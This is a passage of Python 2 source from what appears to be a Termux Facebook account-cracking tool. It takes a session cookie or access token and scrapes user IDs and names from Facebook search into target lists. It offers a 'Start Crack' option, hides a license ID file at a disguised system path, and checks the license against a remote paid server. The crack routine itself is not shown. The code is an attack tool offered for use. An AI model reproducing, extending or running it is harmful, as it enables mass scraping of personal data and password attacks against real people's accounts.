        print '\r\x1b[1;95m•\x1b[1;96m [GET]\x1b[1;93m (\x1b[1;92m%s\x1b[1;93m) press ctrl+z for stop' % len(open(fl).read().splitlines()),
        sys.stdout.flush()
        if '<img alt=' in str(i):
            if 'home.php' in str(i['href']):
                continue
            else:
                g = str(i['href'])
                if 'profile.php' in g:
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    d = bs4.re.findall('/profile\\.php\\?id=(.*?)&', g)
                    if len(d) != 0:
                        pk = ('').join(d)
                        if pk in open(fl).read():
                            pass
                        else:
                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
                else:
                    d = bs4.re.findall('/(.*?)\\?', g)
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    if len(d) != 0:
                        pk = ('').join(d)
                        if pk in open(fl).read():
                            pass
                        else:
                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
        if 'Lihat Hasil Selanjutnya' in i.text:
            search(fl, r, i['href'])

    exit('\n\x1b[1;92m• finished.')


def cek(arg):
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return True
        else:
            return False

    else:
        return False


def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            cookie = raw_input('\x1b[1;95m•\x1b[1;96m cookie\x1b[1;91m : \x1b[1;93m')
            cvds = cvd(cookie)
            new = True
        except:
            print '\x1b[1;91m• invalid cookie'
            dumpfl()

    else:
        cvds = cvd(open('.cok').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        clear()
        if lang(cvds) != True:
            exit('\x1b[1;91m• failed when detecting language or login failed')
        print ' \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•\n\x1b[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\x1b[1;97m   |_____  |    \\_ |     | |_____  |    \\_\n\n\x1b[1;95m     • \x1b[0;93mGithub -> github.com/ROMI-AFRZL \x1b[1;95m•   \n \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•'
        print '\n\x1b[1;95m• \x1b[1;96mlogin as\x1b[1;91m :\x1b[1;93m %s ' % bs4.BeautifulSoup(r, 'html.parser').find('title').text[0:10]
        if new == True:
            open('.cok', 'w').write(cookie)
            print banner()
        fl = raw_input('\x1b[1;95m•\x1b[1;96m filename\x1b[1;91m : \x1b[1;93m').replace(' ', '_')
        s = raw_input('\x1b[1;95m•\x1b[1;96m search query\x1b[1;91m : \x1b[1;93m')
        search(fl, cvds, 'https://mbasic.facebook.com/search/people/?q=' + s)
    else:
        try:
            os.remove('.cok')
        except:
            pass

        print '\x1b[1;91m• login fail!'
        dumpfl()
    return


class lc:

    def __init__(self):
        self.path = '/data/data/com.termux/files/usr/lib/.bash'
        self.host = requests.get('https://raw.githubusercontent.com/ASU-TOOLKIT/server/master/server.txt').text.strip()
        self.genid()

    def paths(self):
        try:
            if os.path.exists(self.path):
                if os.path.getsize(self.path) != 0:
                    self.cek()
                else:
                    self.genid()
            else:
                self.genid()
        except Exception as e:
            exit('\x1b[1;91m• an error accoured %s' % e)

    def genid(self):
        id = []
        abs = list('abcdefghijklmnopqrstuvwxyz1234567890')
        for i in range(20):
            id.append(random.choice([random.choice(abs), random.choice(abs).upper()]))

        print '\x1b[1;95m•\x1b[1;96m your id\x1b[1;91m :\x1b[1;93m ' + ('').join(id)
        open(self.path, 'w').write(('').join(id))
        raw_input('* press enter to register or submit order..')
        exit(subprocess.Popen(['am', 'start',
         self.host.format('index.php?action=reg&id=' + ('').join(id))], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE).wait())

    def cek(self):
        r = requests.post(self.host.format('index.php?action=cek'), data={'id': open(self.path).read().strip()})
        if r.json().get('status') == 'success':
            if r.json().get('result')['confirmed'] == 'false':
                print '\t[ hello %s ]\n' % r.json().get('result')['name']
                print '%s* your id: (%s) unconfirmed%s' % (G, open(self.path).read().strip(), N)
                raw_input('* press enter to get confirmation.')
                exit(subprocess.Popen([
                 'am', 'start',
                 'https://wa.me/' + requests.get('https://api-asutoolkit.cloudaccess.host/no.txt').text.strip() + '?text=please confirm me\n\nID: ' + open(self.path).read().strip() + '\nNAME: ' + r.json()['result']['name'] + '\nORDER:  %sdays' % r.json().get('result')['license_limit']], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE).wait())
            else:
                clear()
                banner()
                print '  + order: %s days, name- %s' % (r.json()['result']['license_limit'], r.json()['result']['name'])
                if os.path.exists('.browser'):
                    if os.path.getsize('.browser') != 0:
                        pass
                    else:
                        open('.browser', 'w').write(r.json()['result']['browser'])
                else:
                    open('.browser', 'w').write(r.json()['result']['browser'])
                if r.json()['result']['vip'] == 'true':
                    print '  + days used: %s' % r.json()['tinggal']
                    print '  + VIP: %syes%s' % (G, N)
                    print '  ' + '=' * 40 + '\n'
                else:
                    print '  + days used: %s' % r.json()['tinggal']
                    print '  + VIP: %sno%s' % (R, N)
                    print '  ' + '=' * 40 + '\n'
        elif 'not found' in r.text:
            self.genid()
        else:
            print '\x1b[1;91m• error, %s' % r.json()['message']
            self.genid()


if os.path.exists('ok.txt'):
    pass
else:
    open('ok.txt', 'a+').close()

def update():
    os.system('clear')
    os.system('pkg update && pkg upgrade')
    os.system('git pull')
    os.system('python2 bff-2.py')


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m• invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m• invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• Tidak ada koneksi'
        exit()

    banner()
    print '\n\x1b[1;95m•\x1b[1;96m \x1b[1;96mWelcome \x1b[1;92m' + nama + '\x1b[1;96m '
    print '  '
    print '\x1b[1;95m•\x1b[1;92m 1 \x1b[1;96mDump Id Public'
    print '\x1b[1;95m•\x1b[1;92m 2 \x1b[1;96mDump Id Followers '
    print '\x1b[1;95m•\x1b[1;92m 3 \x1b[1;96mStart Crack'
    print '\x1b[1;95m•\x1b[1;92m 4 \x1b[1;96mCek Result'
    print '\x1b[1;95m•\x1b[1;92m 5 \x1b[1;92mUpdate Tools'
    print '\x1b[1;95m•\x1b[1;91m 0 \x1b[1;91mRemove Token/Cookie\n'
    r = raw_input('\x1b[1;95m•\x1b[1;92m \x1b[1;96mSelect\x1b[1;91m : \x1b[1;93m')
    if r == '':
        os.system('clear')
        print ' \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•\n\x1b[1;91m     _______  ______ _______ _______ _     _\n     |       |_____/ |_____| |       |____/ \n\x1b[1;97m     |_____  |    \\_ |     | |_____  |    \\_\n\n\x1b[1;95m       • \x1b[0;93mGithub -> github.com/ROMI-AFRZL \x1b[1;95m•   \n \x1b[1;91m•\x1b[1;93m•\x1b[1;92m• '
    elif r == '1':
        publik()
    elif r == '2':
        followers()
    elif r == '33':
        dump_grup(basecookie())
    elif r == '5':
        update()
    elif r == '3':
        crack()
        exit()
    elif r == '4':
        result()
    elif r == '66':
        raw_input('\x1b[1;95m• \x1b[1;93mpress enter ')
        os.system('xdg-open https://www.facebook.com/Romi.Uyey')
        try:
            os.remove('/data/data/com.termux/files/usr/lib/.bash')
            exit('\x1b[1;92m• run again the tools.')
        except:
            exit('\x1b[1;95m•\x1b[1;96m towards the browser')

    elif r == '77':
        print ' '
        print '\x1b[1;95m• \x1b[1;96mplease wait opening group'
        exit(subprocess.Popen(['am', 'start', 'https://www.facebook.com/groups/453688872336137'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE).wait())
    elif r == '0':
        print ''
        tik()
        jalan('\n\x1b[1;92m• Succes Remove Cookie/Token')
        os.system('rm -rf login.txt')
        os.sys.exit()
    else:
        print '\x1b[1;91m• Wrong Input'
        os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.06)


if __name__ == '__main__':
    menu()
